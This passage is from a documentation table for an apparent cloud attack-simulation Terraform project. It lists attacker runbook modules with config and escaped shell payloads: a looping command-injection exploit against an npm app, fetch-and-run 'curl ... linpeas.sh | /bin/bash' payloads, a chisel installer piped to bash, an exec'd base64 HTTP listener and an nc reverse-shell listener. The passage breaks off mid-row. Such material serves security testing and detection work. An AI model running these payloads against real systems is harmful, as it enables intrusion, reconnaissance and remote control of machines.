                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-runbook-execute-exploit-npm-app                 | ./modules/runbook/execute-exploit-npm-app            | runbook_exec_exploit_npm_app                     | context.azure.runbook.attacker.execute.exploit_npm_app            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;exploit_npm_app&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;target_ip&quot;: null,<br/>                            &quot;target_port&quot;: 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app            | <pre>locals &amp;&amp;#35;123;<br/>    attack&amp;&amp;#35;95;dir = &quot;/npm&amp;&amp;#35;95;attack&quot;<br/>    target&amp;&amp;#35;95;ip=var&amp;#46;inputs&amp;&amp;#35;91;&quot;target&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    target&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;target&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting script&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &quot;payload: curl &amp;#45;&amp;#45;get &amp;#45;&amp;#45;verbose &amp;&amp;#35;92;&quot;http://$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;port&amp;&amp;#35;125;/api/getServices&amp;&amp;#35;92;&quot; &amp;#45;&amp;#45;data&amp;#45;urlencode &#x27;name&amp;&amp;#35;91;&amp;&amp;#35;93;=&amp;&amp;#35;92;$&amp;&amp;#35;40;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;&amp;#35;41;&#x27;&quot;<br/>        log &quot;checking target: $&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>        while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv $&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;ip&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;port&amp;&amp;#35;125; &gt; /dev/null; do<br/>            log &quot;failed check &amp;#45; waiting for target: $&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;;<br/>            sleep 30;<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available &amp;#45; sending payload&quot;;<br/>        sleep 5;<br/>        curl &amp;#45;&amp;#45;get &amp;#45;&amp;#45;verbose &quot;http://$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;target&amp;&amp;#35;95;port&amp;&amp;#35;125;/api/getServices&quot; &amp;#45;&amp;#45;data&amp;#45;urlencode &#x27;name&amp;&amp;#35;91;&amp;&amp;#35;93;=$&amp;&amp;#35;40;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;&amp;#35;41;&#x27; &gt;&gt; $LOGFILE 2&gt;&amp;1;<br/>        echo &quot;&amp;&amp;#35;92;n&quot; &gt;&gt; $LOGFILE<br/>        log &quot;payload sent sleeping&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &quot;done&quot;;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            log &quot;waiting $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; seconds&amp;#46;&amp;#46;&amp;#46;&quot;;<br/>            sleep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-runbook-listener-http-listener                  | ./modules/runbook/listener-http-listener             | runbook_exec_responder_http_listener             | context.azure.runbook.attacker.listener.http                      | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;listener&quot;: {<br/>                        &quot;http&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener             | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    listen&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    mkdir &amp;#45;p /tmp/www/<br/>    echo &quot;index&quot; &gt; /tmp/www/index&amp;#46;html<br/>    mkdir &amp;#45;p /tmp/www/upload/v2<br/>    echo &quot;upload&quot; &gt; /tmp/www/upload/v2/index&amp;#46;html<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;listener: $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>        screen &amp;#45;S http &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        APPLOG=/tmp/http&amp;&amp;#35;95;$SCRIPTNAME&amp;#46;log<br/>        for i in &amp;&amp;#35;96;seq $&amp;&amp;#35;40;&amp;&amp;#35;40;MAXLOG&amp;#45;1&amp;&amp;#35;41;&amp;&amp;#35;41; &amp;#45;1 1&amp;&amp;#35;96;; do mv &quot;$APPLOG&amp;#46;&quot;&amp;&amp;#35;123;$i,$&amp;&amp;#35;40;&amp;&amp;#35;40;i&amp;#43;1&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125; 2&gt;/dev/null &amp;#124;&amp;#124; true; done<br/>        mv $APPLOG &quot;$APPLOG&amp;#46;1&quot; 2&gt;/dev/null &amp;#124;&amp;#124; true<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/http&amp;#46;log &amp;#45;S http &amp;#45;m python3 &amp;#45;c &quot;import base64; exec&amp;&amp;#35;40;base64&amp;#46;b64decode&amp;&amp;#35;40;&#x27;$&amp;&amp;#35;123;base64encode&amp;&amp;#35;40;local&amp;#46;app&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;&amp;&amp;#35;41;&quot;<br/>        screen &amp;#45;S http &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode&amp;&amp;#35;40;templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/app&amp;#46;py&amp;#46;tpl&quot;,<br/>                &amp;&amp;#35;123;<br/>                    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-runbook-responder-port-forward                  | ./modules/runbook/responder-port-forward             | runbook_exec_responder_port_forward              | context.azure.runbook.attacker.responder.port_forward             | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;port_forward&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward             | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        killall &amp;#45;9 chisel<br/>        truncate &amp;#45;s 0 /tmp/chisel&amp;#46;log<br/>        log &quot;checking for chisel&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v chisel; do<br/>            log &quot;chisel not found &amp;#45; installing&quot;<br/>            curl https://i&amp;#46;jpillora&amp;#46;com/chisel&amp;#33; &amp;#124; bash<br/>            sleep 10<br/>        done<br/>        log &quot;chisel: $&amp;&amp;#35;40;command &amp;#45;v  chisel&amp;&amp;#35;41;&quot;<br/>        /usr/local/bin/chisel server &amp;#45;v &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125; &gt; /tmp/chisel&amp;#46;log 2&gt;&amp;1 &amp;<br/>        log &quot;responder started&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-runbook-responder-reverse-shell                 | ./modules/runbook/responder-reverse-shell            | runbook_exec_responder_reverse_shell             | context.azure.runbook.attacker.responder.reverse_shell            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell            | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    listen&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        screen &amp;#45;S netcat &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        truncate &amp;#45;s 0 /tmp/netcat&amp;#46;log<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/netcat&amp;#46;log &amp;#45;S netcat &amp;#45;m nc &amp;#45;vv &amp;#45;nl $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;ip&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;<br/>        screen &amp;#45;S netcat &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started&amp;#46;&amp;#46;&quot;<br/>        until tail 